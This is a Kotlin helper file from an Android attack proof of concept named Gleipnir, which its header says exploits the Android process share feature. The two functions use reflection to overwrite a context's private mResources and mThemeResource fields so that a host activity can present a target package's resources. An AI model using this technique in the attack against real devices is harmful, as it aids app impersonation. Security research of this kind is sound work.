/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.extensions

import android.app.Activity
import android.content.Context
import android.content.ContextWrapper
import android.content.res.AssetManager
import android.content.res.Resources
import org.gleipnir.app.helpers.ResourceHelper
import org.gleipnir.app.reflectionHelper.getReflective
import org.gleipnir.app.reflectionHelper.setReflective


fun ContextWrapper.patchBaseResources(
    resources: Resources,
    hostActivity: Activity,
    assets: AssetManager,
    targetPackageName:String
) {
    baseContext?.let { ctxt ->
        getReflective<Resources?>(
            ctxt, "mResources"
        )?.let { res ->
            setReflective(
                ctxt, "mResources", ResourceHelper(
                    assets,
                    hostActivity.resources.displayMetrics,
                    hostActivity.resources.configuration,
                    resources,
                    targetPackageName,
                    hostActivity.packageName
                )
            )
        }
    }
}

fun ContextWrapper.setBaseTheme(
    id: Int
) {
    baseContext?.let { ctxt ->
        getReflective<Any>(
            ctxt, "mThemeResource"
        )?.let { res ->
            setReflective(
                ctxt, "mThemeResource", id
            )
        }
    }
}